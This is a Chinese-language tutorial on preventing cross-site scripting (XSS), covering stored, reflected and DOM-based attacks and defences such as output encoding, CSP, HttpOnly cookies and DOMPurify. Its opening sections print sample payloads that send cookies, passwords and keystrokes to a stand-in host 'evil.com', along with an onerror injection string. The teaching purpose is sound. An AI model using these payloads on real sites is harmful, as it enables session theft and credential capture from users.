---
title: 如何防止 跨站脚本攻击（Cross-Site Scripting, XSS）
category: 安全
difficulty: 中级
updatedAt: 2025-11-28
summary: >-
  深入理解 XSS 攻击的类型和原理，掌握输入验证、输出编码、CSP 等多种防御方法
tags:
  - XSS
  - 安全
  - Web安全
  - 防御
estimatedTime: 28 分钟
keywords:
  - XSS
  - 跨站脚本攻击
  - 输入验证
  - 输出编码
  - CSP
highlight: XSS 是最常见的 Web 安全漏洞，通过输入验证、输出编码和 CSP 可有效防御
order: 20
---

## 问题 1：什么是 XSS 攻击？

XSS（Cross-Site Scripting，跨站脚本攻击）是一种代码注入攻击，攻击者在网页中注入恶意脚本，当其他用户浏览该网页时，恶意脚本会在用户浏览器中执行。

### XSS 攻击的危害

```javascript
// XSS 攻击可以做什么？

// 1. 窃取 Cookie
document.location = 'http://evil.com/steal?cookie=' + document.cookie;

// 2. 窃取用户输入
document.querySelector('input[type="password"]').addEventListener('input', (e) => {
  fetch('http://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify({ password: e.target.value })
  });
});

// 3. 篡改页面内容
document.body.innerHTML = '<h1>网站已被黑客攻击</h1>';

// 4. 重定向到钓鱼网站
window.location.href = 'http://phishing-site.com';

// 5. 发起请求（以用户身份）
fetch('/api/transfer', {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify({ to: 'attacker', amount: 10000 })
});

// 6. 键盘记录
document.addEventListener('keypress', (e) => {
  fetch('http://evil.com/log', {
    method: 'POST',
    body: e.key
  });
});
```

---

## 问题 2：XSS 攻击的类型

### 1. 存储型 XSS（Stored XSS）

```javascript
// 最危险的 XSS 类型，恶意脚本存储在服务器数据库中

// 攻击场景：论坛评论
// 1. 攻击者发表评论，包含恶意脚本
const comment = `
  很棒的文章！
  <script>
    fetch('http://evil.com/steal?cookie=' + document.cookie);
  </script>
`;

// 2. 服务器存储评论（未过滤）
db.comments.insert({
  content: comment,
  author: 'attacker',
  createdAt: new Date()
});

// 3. 其他用户查看评论
app.get('/comments', (req, res) => {
  const comments = db.comments.find();
  res.render('comments', { comments });
});

// 4. 页面渲染评论（未编码）
<div class="comment">
  <%= comment.content %>  <!-- ❌ 直接输出，脚本会执行 -->
</div>

// 5. 所有访问该页面的用户都会执行恶意脚本
// ❌ Cookie 被窃取
```

### 2. 反射型 XSS（Reflected XSS）

```javascript
// 恶意脚本通过 URL 参数传递，立即反射回页面

// 攻击场景：搜索功能
// 1. 正常搜索
https://example.com/search?q=javascript

// 页面显示：
<h1>搜索结果：javascript</h1>

// 2. 攻击者构造恶意 URL
const maliciousURL = `
  https://example.com/search?q=<script>
    fetch('http://evil.com/steal?cookie=' + document.cookie);
  </script>
`;

// 3. 服务器处理搜索（未过滤）
app.get('/search', (req, res) => {
  const query = req.query.q;
  res.send(`<h1>搜索结果：${query}</h1>`);  // ❌ 直接输出
});

// 4. 攻击者诱导用户点击链接
// 通过邮件、社交媒体等发送链接

// 5. 用户点击后，脚本立即执行
// ❌ Cookie 被窃取
```

### 3. DOM 型 XSS（DOM-based XSS）

```javascript
// 恶意脚本在客户端执行，不经过服务器

// 攻击场景：客户端路由
// 1. 页面代码（不安全）
<!DOCTYPE html>
<html>
<body>
  <div id="content"></div>
  
  <script>
    // 从 URL 获取参数
    const params = new URLSearchParams(window.location.search);
    const name = params.get('name');
    
    // ❌ 直接插入 DOM
    document.getElementById('content').innerHTML = `
      <h1>欢迎，${name}！</h1>
    `;
  </script>
</body>
</html>

// 2. 攻击者构造恶意 URL
https://example.com/?name=<img src=x onerror="alert(document.cookie)">

// 3. 用户访问该 URL
// 4. 脚本在客户端执行
// ❌ Cookie 被窃取

// 其他 DOM XSS 场景
// location.hash
const hash = location.hash.slice(1);
document.write(hash);  // ❌ 危险

// document.referrer
document.write('来自：' + document.referrer);  // ❌ 危险

// window.name
document.getElementById('content').innerHTML = window.name;  // ❌ 危险
```

---

## 问题 3：如何防御 XSS 攻击？

### 防御方法 1：输入验证

```javascript
// 验证和过滤用户输入

// 1. 白名单验证
function validateUsername(username) {
  // 只允许字母、数字、下划线
  const pattern = /^[a-zA-Z0-9_]+$/;
  
  if (!pattern.test(username)) {
    throw new Error('用户名只能包含字母、数字和下划线');
  }
  
  return username;
}

// 2. 长度限制
function validateComment(comment) {
  if (comment.length > 1000) {
    throw new Error('评论不能超过 1000 字符');
  }
  
  return comment;
}

// 3. 类型验证
function validateAge(age) {
  const numAge = parseInt(age, 10);
  
  if (isNaN(numAge) || numAge < 0 || numAge > 150) {
    throw new Error('年龄必须是 0-150 之间的数字');
  }
  
  return numAge;
}

// 4. 移除危险字符
function sanitizeInput(input) {
  // 移除 HTML 标签
  return input.replace(/<[^>]*>/g, '');
}

// 5. 使用专业库
const validator = require('validator');

// 验证邮箱
if (!validator.isEmail(email)) {
  throw new Error('邮箱格式不正确');
}

// 验证 URL
if (!validator.isURL(url)) {
  throw new Error('URL 格式不正确');
}

// 转义 HTML
const escaped = validator.escape(input);
```

### 防御方法 2：输出编码

```javascript
// 在输出时对数据进行编码，防止脚本执行

// 1. HTML 编码
function escapeHTML(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;'
  };
  
  return str.replace(/[&<>"'/]/g, (char) => map[char]);
}

// 使用
const userInput = '<script>alert("XSS")</script>';
const safe = escapeHTML(userInput);
// "&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;"

// 2. JavaScript 编码
function escapeJS(str) {
  return str
    .replace(/\\/g, '\\\\')
    .replace(/'/g, "\\'")
    .replace(/"/g, '\\"')
    .replace(/\n/g, '\\n')
    .replace(/\r/g, '\\r')
    .replace(/\t/g, '\\t');
}

// 3. URL 编码
const encoded = encodeURIComponent(userInput);

// 4. CSS 编码
function escapeCSS(str) {
  return str.replace(/[^a-zA-Z0-9]/g, (char) => {
    return '\\' + char.charCodeAt(0).toString(16) + ' ';
  });
}
```

```javascript
// 在模板中使用编码

// EJS（自动编码）
<div>
  <%= userInput %>  <!-- ✅ 自动 HTML 编码 -->
</div>

<div>
  <%- userInput %>  <!-- ❌ 不编码，危险 -->
</div>

// Handlebars（自动编码）
<div>
  {{userInput}}  <!-- ✅ 自动 HTML 编码 -->
</div>

<div>
  {{{userInput}}}  <!-- ❌ 不编码，危险 -->
</div>

// React（自动编码）
<div>
  {userInput}  {/* ✅ 自动编码 */}
</div>

<div dangerouslySetInnerHTML={{__html: userInput}} />  {/* ❌ 危险 */}

// Vue（自动编码）
<div>
  {{ userInput }}  <!-- ✅ 自动编码 -->
</div>

<div v-html="userInput"></div>  <!-- ❌ 危险 -->
```

### 防御方法 3：使用 CSP（内容安全策略）

```javascript
// CSP 限制页面可以加载和执行的资源

// 服务器设置 CSP 响应头
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; " +
    "script-src 'self' https://trusted-cdn.com; " +
    "style-src 'self' 'unsafe-inline'; " +
    "img-src 'self' data: https:; " +
    "font-src 'self' https://fonts.gstatic.com; " +
    "connect-src 'self' https://api.example.com; " +
    "frame-ancestors 'none'; " +
    "base-uri 'self'; " +
    "form-action 'self'"
  );
  next();
});

// CSP 的作用：
// 1. 阻止内联脚本执行
<script>alert('XSS')</script>  // ❌ 被阻止

// 2. 阻止 eval() 等危险函数
eval('alert("XSS")');  // ❌ 被阻止

// 3. 阻止加载外部恶意脚本
<script src="http://evil.com/malicious.js"></script>  // ❌ 被阻止

// 4. 阻止内联事件处理器
<img src="x" onerror="alert('XSS')">  // ❌ 被阻止

// 使用 nonce 允许特定内联脚本
const nonce = crypto.randomBytes(16).toString('base64');

res.setHeader(
  'Content-Security-Policy',
  `script-src 'self' 'nonce-${nonce}'`
);

// HTML 中使用 nonce
<script nonce="<%= nonce %>">
  // ✅ 这个脚本可以执行
  console.log('Allowed script');
</script>
```

### 防御方法 4：HttpOnly Cookie

```javascript
// 设置 HttpOnly 防止 JavaScript 访问 Cookie

// 服务器设置 Cookie
res.cookie('sessionId', sessionId, {
  httpOnly: true,  // ✅ JavaScript 无法访问
  secure: true,    // 只在 HTTPS 下传输
  sameSite: 'strict'
});

// 即使发生 XSS，攻击者也无法窃取 Cookie
document.cookie;  // 看不到 httpOnly 的 Cookie

// ⚠️ 注意：
// - HttpOnly 只能防止 Cookie 被窃取
// - 不能防止其他 XSS 攻击（如篡改页面、发起请求等）
```

### 防御方法 5：使用安全的 API

```javascript
// 使用安全的 DOM API，避免危险操作

// ❌ 危险的 API
element.innerHTML = userInput;  // 可能执行脚本
document.write(userInput);      // 可能执行脚本
eval(userInput);                // 直接执行代码
setTimeout(userInput, 1000);    // 可能执行代码
new Function(userInput)();      // 直接执行代码

// ✅ 安全的 API
element.textContent = userInput;  // 只设置文本，不解析 HTML
element.setAttribute('data-value', userInput);  // 设置属性

// 创建元素
const div = document.createElement('div');
div.textContent = userInput;
container.appendChild(div);

// 使用 DOMPurify 清理 HTML
const clean = DOMPurify.sanitize(userInput);
element.innerHTML = clean;
```

### 防御方法 6：使用模板引擎的自动转义

```javascript
// 现代模板引擎默认会转义输出

// React
function Comment({ text }) {
  // ✅ 自动转义
  return <div>{text}</div>;
  
  // ❌ 危险：不转义
  // return <div dangerouslySetInnerHTML={{__html: text}} />;
}

// Vue
<template>
  <!-- ✅ 自动转义 -->
  <div>{{ comment }}</div>
  
  <!-- ❌ 危险：不转义 -->
  <!-- <div v-html="comment"></div> -->
</template>

// Angular
<div>
  <!-- ✅ 自动转义 -->
  {{ comment }}
</div>

// EJS
<div>
  <%=comment %>  <!-- ✅ 自动转义 -->
  <%- comment %>  <!-- ❌ 不转义 -->
</div>
```

---

## 问题 4：XSS 防御的最佳实践

### 综合防御策略

```javascript
// 多层防御，确保安全

// 1. 输入层：验证和过滤
function handleUserInput(input) {
  // 验证类型
  if (typeof input !== 'string') {
    throw new Error('Invalid input type');
  }
  
  // 长度限制
  if (input.length > 1000) {
    throw new Error('Input too long');
  }
  
  // 移除危险字符
  const sanitized = input.replace(/<script[^>]*>.*?<\/script>/gi, '');
  
  return sanitized;
}

// 2. 存储层：编码后存储
function saveComment(comment) {
  const escaped = escapeHTML(comment);
  
  db.comments.insert({
    content: escaped,
    createdAt: new Date()
  });
}

// 3. 输出层：再次编码
app.get('/comments', (req, res) => {
  const comments = db.comments.find();
  
  // 使用自动转义的模板引擎
  res.render('comments', { comments });
});

// 4. HTTP 头：设置 CSP
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self'; object-src 'none'"
  );
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('X-XSS-Protection', '1; mode=block');
  next();
});

// 5. Cookie：设置 HttpOnly
res.cookie('sessionId', sessionId, {
  httpOnly: true,
  secure: true,
  sameSite: 'strict'
});
```

### 代码审查清单

```javascript
// XSS 安全审查清单

// ✅ 检查点 1：用户输入
// - 所有用户输入都经过验证？
// - 使用白名单而不是黑名单？
// - 有长度限制？

// ✅ 检查点 2：输出编码
// - 所有输出都经过编码？
// - 使用了正确的编码方式（HTML/JS/URL/CSS）？
// - 模板引擎配置为自动转义？

// ✅ 检查点 3：危险 API
// - 避免使用 innerHTML？
// - 避免使用 eval()？
// - 避免使用 document.write()？
// - 避免使用 setTimeout/setInterval 的字符串参数？

// ✅ 检查点 4：CSP
// - 设置了 CSP 响应头？
// - 禁用了 unsafe-inline 和 unsafe-eval？
// - 使用了 nonce 或 hash？

// ✅ 检查点 5：Cookie 安全
// - 敏感 Cookie 设置了 HttpOnly？
// - 设置了 Secure 和 SameSite？

// ✅ 检查点 6：第三方库
// - 使用了最新版本？
// - 检查了已知漏洞？
// - 使用了可信的来源？
```

### 使用安全库

```javascript
// 推荐的安全库

// 1. DOMPurify - HTML 清理
import DOMPurify from 'dompurify';

const dirty = '<img src=x onerror=alert(1)>';
const clean = DOMPurify.sanitize(dirty);
// "<img src="x">"

// 2. js-xss - XSS 过滤
const xss = require('xss');

const html = xss('<script>alert("xss");</script>');
// ""

// 3. helmet - 设置安全 HTTP 头
const helmet = require('helmet');

app.use(helmet());
// 自动设置多个安全相关的 HTTP 头

// 4. validator - 输入验证
const validator = require('validator');

validator.isEmail('test@example.com');  // true
validator.isURL('https://example.com');  // true
validator.escape('<script>alert(1)</script>');  // "&lt;script&gt;alert(1)&lt;&#x2F;script&gt;"

// 5. express-validator - Express 验证中间件
const { body, validationResult } = require('express-validator');

app.post('/comment',
  body('content').trim().escape().isLength({ max: 1000 }),
  (req, res) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    
    // 处理评论
  }
);
```

---

## 总结

**核心概念总结**：

### 1. XSS 攻击类型

- **存储型 XSS**：恶意脚本存储在数据库，影响所有用户
- **反射型 XSS**：恶意脚本通过 URL 传递，立即执行
- **DOM 型 XSS**：在客户端执行，不经过服务器

### 2. XSS 的危害

- 窃取 Cookie 和敏感信息
- 篡改页面内容
- 重定向到钓鱼网站
- 以用户身份发起请求
- 键盘记录

### 3. 防御方法

- **输入验证**：白名单、长度限制、类型验证
- **输出编码**：HTML/JS/URL/CSS 编码
- **CSP**：限制资源加载和脚本执行
- **HttpOnly Cookie**：防止 Cookie 被窃取
- **安全 API**：避免危险的 DOM 操作
- **模板引擎**：使用自动转义

### 4. 最佳实践

- 多层防御（输入、存储、输出）
- 使用安全库（DOMPurify、helmet）
- 设置安全 HTTP 头
- 定期代码审查
- 保持依赖更新

## 延伸阅读

- [OWASP - XSS](https://owasp.org/www-community/attacks/xss/)
- [MDN - Content Security Policy](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CSP)
- [XSS Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
- [DOMPurify](https://github.com/cure53/DOMPurify)
- [Helmet.js](https://helmetjs.github.io/)
